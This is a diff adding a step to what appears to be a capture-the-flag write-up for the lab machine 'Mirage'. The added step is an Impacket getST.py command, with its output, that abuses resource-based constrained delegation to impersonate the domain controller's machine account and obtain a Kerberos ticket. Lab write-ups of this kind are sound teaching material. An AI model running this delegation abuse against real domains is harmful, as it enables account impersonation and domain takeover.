@@ -955,6 +955,18 @@ mirage-service$ can now impersonate users on DC01$ via S4U2Proxy
 Now RBCD should be setup
 
 ```python
+❯❯❯ faketime -f +7h getST.py -spn 'cifs/DC01.mirage.htb' -impersonate "DC01$" -dc-ip 10.129.232.163 "mirage.htb"/"mirage-service$" -k -no-pass
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating DC01$
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in DC01$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache
+```
+
+I can get a TGT for the `DC01$` machine account
+
+```python
 
 ```
 
